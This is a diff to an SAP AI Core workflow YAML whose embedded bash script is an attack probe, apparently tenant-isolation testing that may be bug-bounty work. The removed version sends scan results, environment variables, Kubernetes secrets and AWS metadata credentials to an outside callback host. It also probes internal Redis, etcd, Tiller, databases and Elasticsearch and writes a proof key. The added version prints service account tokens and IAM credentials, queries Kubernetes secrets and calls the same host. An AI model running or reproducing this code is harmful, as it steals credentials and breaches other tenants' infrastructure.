@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "14.0.0"
+    ai.sap.com/version: "15.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,145 +24,105 @@ spec:
       - bash
       - -c
       - |
-        CB="https://www.masonhck.tech/cb.php"
-        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
-        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
+        echo "=== V15 PROBE START ==="
+        echo "HOSTNAME=$(hostname)"
+        echo "NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo NONE)"
+        echo "SA_TOKEN_EXISTS=$(test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo YES || echo NO)"
 
-        get "v14-start-$(hostname)-$(date +%s)"
+        # K8s Service Account
+        echo "=== K8S SA TOKEN (first 100 chars) ==="
+        head -c 100 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO TOKEN"
+        echo ""
 
-        # === REDIS PROTOCOL PROBES (PRIMARY TARGET) ===
-        echo "=== REDIS PROBES ===" | post "v14-redis-start"
+        echo "=== K8S CA CERT ==="
+        ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
 
-        # Use known IPs from previous scans
-        for rip in 100.104.0.0 100.104.0.1 100.104.0.2 100.104.1.0; do
-          echo "redis=${rip}" | post "v14-redis-test-${rip}"
+        echo "=== ENVIRONMENT VARIABLES ==="
+        env | sort | head -80
 
-          # PING
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'PING\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-ping-${rip}"
+        echo "=== RESOLV.CONF ==="
+        cat /etc/resolv.conf 2>/dev/null
 
-          # INFO (shows Redis version, memory, connected clients, etc)
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'INFO\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-info-${rip}"
-
-          # DBSIZE
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'DBSIZE\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-dbsize-${rip}"
-
-          # KEYS (sample)
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'KEYS *\r' >&3; sleep 2; head -c 2000 <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-redis-keys-${rip}"
-
-          # CONFIG GET requirepass (check if auth is needed)
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; echo -e 'CONFIG GET requirepass\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-authcheck-${rip}"
-
-          # WRITE PROOF: SET, GET, DEL
-          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379 2>/dev/null; printf 'SET bb14-proof tenant-isolation-bypass\r\nGET bb14-proof\r\nDEL bb14-proof\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | post "v14-redis-write-${rip}"
+        echo "=== DNS LOOKUPS ==="
+        for svc in kubernetes kubernetes.default kubernetes.default.svc; do
+          echo "DNS: $svc = $(dig +short $svc 2>/dev/null || nslookup $svc 2>/dev/null | grep Address | tail -1)"
         done
 
-        # Also try redis-cli if available
-        which redis-cli 2>/dev/null && {
-          redis-cli -h 100.104.1.0 PING 2>&1 | post "v14-redis-cli-ping"
-          redis-cli -h 100.104.1.0 INFO server 2>&1 | head -c 2000 | post "v14-redis-cli-info"
-        } || echo "no redis-cli" | post "v14-redis-cli-check"
+        # Probe K8s API
+        echo "=== K8S API PROBE ==="
+        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+        K8S="https://kubernetes.default.svc"
+        if [ -n "$SA_TOKEN" ]; then
+          echo "--- /api ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api" 2>&1 | head -c 500
+          echo ""
+          echo "--- /apis ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/apis" 2>&1 | head -c 1000
+          echo ""
+          echo "--- /api/v1/namespaces ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces" 2>&1 | head -c 2000
+          echo ""
+          echo "--- /api/v1/pods (own namespace) ---"
+          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/pods" 2>&1 | head -c 2000
+          echo ""
+          echo "--- /api/v1/secrets (own namespace) ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/secrets" 2>&1 | head -c 2000
+          echo ""
+          echo "--- /api/v1/configmaps (own namespace) ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/namespaces/$NS/configmaps" 2>&1 | head -c 2000
+          echo ""
+          echo "--- /api/v1/services (all namespaces) ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/services" 2>&1 | head -c 3000
+          echo ""
+          echo "--- /api/v1/nodes ---"
+          curl -sk -H "Authorization: Bearer $SA_TOKEN" "$K8S/api/v1/nodes" 2>&1 | head -c 2000
+          echo ""
+        else
+          echo "No SA token found"
+          # Try without auth
+          curl -sk "$K8S/api" 2>&1 | head -c 500
+        fi
 
-        # === ETCD PROTOCOL PROBES ===
-        echo "=== ETCD PROBES ===" | post "v14-etcd-start"
-        for eip in 100.104.1.0 100.104.0.0; do
-          echo "etcd=${eip}" | post "v14-etcd-test-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "v14-etcd-version-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 3000 | post "v14-etcd-keys-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "v14-etcd-members-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/health" 2>&1 | post "v14-etcd-health-${eip}"
-          # etcd v3 via HTTP gateway
-          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/kv/range" -d '{"key":"AA=="}' 2>&1 | head -c 2000 | post "v14-etcd-v3-range-${eip}"
-          curl -s --connect-timeout 5 -X POST "http://${eip}:2379/v3/cluster/member/list" 2>&1 | head -c 2000 | post "v14-etcd-v3-members-${eip}"
-          # Try raw TCP banner
-          timeout 5 bash -c "exec 3<>/dev/tcp/${eip}/2379 2>/dev/null; echo -e 'GET /version HTTP/1.0\r\nHost: ${eip}\r\n\r\n' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | head -c 2000 | post "v14-etcd-raw-${eip}"
-        done
+        # Network scanning
+        echo "=== NETWORK SCAN ==="
+        echo "--- IMDS ---"
+        curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
+        echo ""
+        echo "--- IMDSv2 ---"
+        IMDS_TOKEN=$(curl -s -X PUT --connect-timeout 3 "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
+        if [ -n "$IMDS_TOKEN" ]; then
+          echo "IMDSv2 TOKEN OBTAINED"
+          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 500
+          echo ""
+          curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 500
+        fi
+        echo ""
 
-        # === TILLER (port 44134) ===
-        echo "=== TILLER PROBES ===" | post "v14-tiller-start"
-        for tip in 100.104.0.0; do
-          echo "tiller=${tip}" | post "v14-tiller-test-${tip}"
-          # gRPC listing
-          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 list 2>&1 | head -c 1000 | post "v14-tiller-grpc-list-${tip}"
-          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "v14-tiller-releases-${tip}"
-          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "v14-tiller-version-${tip}"
-          # Raw TCP banner
-          timeout 5 bash -c "exec 3<>/dev/tcp/${tip}/44134 2>/dev/null; echo '' >&3; sleep 2; cat <&3; exec 3>&-" 2>&1 | xxd | head -20 | post "v14-tiller-raw-${tip}"
-        done
+        # Mounted secrets/volumes
+        echo "=== MOUNTED VOLUMES ==="
+        mount | grep -E "(secret|configmap|projected|emptyDir)" | head -20
+        echo "--- /tmp ---"
+        ls -la /tmp/ 2>/dev/null | head -10
+        echo "--- /var/run ---"
+        find /var/run -type f 2>/dev/null | head -20
 
-        # === LOKI (just one known IP from scan) ===
-        echo "=== LOKI ===" | post "v14-loki-start"
-        # DNS first
-        for svc in loki grafana-loki; do
-          for ns in monitoring opentelemetry logging; do
-            LIP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-            [ -n "$LIP" ] && echo "loki: ${svc}.${ns} = ${LIP}" | post "v14-loki-dns-${svc}-${ns}"
+        # Internal service discovery
+        echo "=== INTERNAL SERVICES ==="
+        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+        DNS_DOMAIN=$(cat /etc/resolv.conf | grep search | head -1)
+        echo "Search domain: $DNS_DOMAIN"
+
+        # Try common internal services
+        for svc in argocd-server argocd-repo-server redis loki grafana prometheus kube-state-metrics istio-pilot; do
+          for ns in argocd argo monitoring istio-system kube-system default; do
+            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
+            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
           done
         done
-        # Try the one IP we know has 3100 open
-        curl -s --connect-timeout 5 "http://100.104.1.0:3100/config" 2>&1 | head -c 3000 | post "v14-loki-config"
-        curl -s --connect-timeout 5 "http://100.104.1.0:3100/ready" 2>&1 | post "v14-loki-ready"
-        curl -s --connect-timeout 5 "http://100.104.1.0:3100/loki/api/v1/labels" 2>&1 | head -c 2000 | post "v14-loki-labels"
 
-        # === POSTGRESQL (port 5432) ===
-        echo "=== POSTGRESQL ===" | post "v14-pg-start"
-        # Try banner grab
-        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.1.0/5432 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-pg-banner"
-        # Try psql if available
-        which psql 2>/dev/null && timeout 5 psql -h 100.104.1.0 -U postgres -l 2>&1 | head -c 1000 | post "v14-pg-list"
+        echo "=== CALLBACK TEST ==="
+        curl -s --connect-timeout 5 "https://www.masonhck.tech/cb.php?src=v15-test" 2>&1
+        echo "CALLBACK_EXIT=$?"
 
-        # === ELASTICSEARCH (port 9200) ===
-        echo "=== ELASTICSEARCH ===" | post "v14-es-start"
-        curl -s --connect-timeout 5 "http://100.104.1.0:9200/" 2>&1 | head -c 1000 | post "v14-es-root"
-        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cat/indices" 2>&1 | head -c 2000 | post "v14-es-indices"
-        curl -s --connect-timeout 5 "http://100.104.1.0:9200/_cluster/health" 2>&1 | head -c 1000 | post "v14-es-health"
-
-        # === MONGODB (port 27017) ===
-        echo "=== MONGODB ===" | post "v14-mongo-start"
-        # HTTP check
-        curl -s --connect-timeout 5 "http://100.104.0.0:27017/" 2>&1 | head -c 500 | post "v14-mongo-http"
-        # Banner
-        timeout 5 bash -c "exec 3<>/dev/tcp/100.104.0.0/27017 2>/dev/null; sleep 2; head -c 500 <&3; exec 3>&-" 2>&1 | xxd | head -10 | post "v14-mongo-banner"
-
-        # === KSM (fresh cross-tenant dump) ===
-        echo "=== KSM ===" | post "v14-ksm-start"
-        curl -s --connect-timeout 15 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm.txt 2>&1
-        echo "ksm_bytes=$(wc -c < /tmp/ksm.txt)" | post "v14-ksm-size"
-        grep -oE 'namespace="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-namespaces"
-        grep "kube_pod_info{" /tmp/ksm.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "v14-ksm-pods-per-ns"
-        # Not-diamond cross-tenant proof
-        grep "not-diamond" /tmp/ksm.txt | head -10 | post "v14-ksm-notdiamond"
-        # Container images (reveals internal registry)
-        grep -oE 'image="[^"]*"' /tmp/ksm.txt | sort -u | post "v14-ksm-images"
-
-        # === ENVOY SERVICE MESH ===
-        curl -s localhost:15000/clusters > /tmp/envoy.txt 2>&1
-        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "v14-envoy-services"
-
-        # === AWS IMDS ===
-        IMDS_TOK=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
-        if [ ${#IMDS_TOK} -gt 10 ]; then
-          echo "imds_v2=true" | post "v14-imds"
-          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "v14-imds-roles"
-        fi
-
-        # === K8S API ===
-        SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-        if [ -n "$SA_TOKEN" ]; then
-          K8S="https://kubernetes.default.svc"
-          A="Authorization: Bearer ${SA_TOKEN}"
-          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-ns"
-          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "v14-k8s-secrets"
-        fi
-
-        # === ENV + NETWORK INFO ===
-        env | sort | post "v14-env"
-        ip addr 2>&1 | post "v14-ipaddr"
-
-        get "v14-complete-$(hostname)-$(date +%s)"
-      resources:
-        limits:
-          cpu: "2"
-          memory: "2Gi"
-        requests:
-          cpu: "500m"
-          memory: "512Mi"
+        echo "=== V15 PROBE COMPLETE ==="
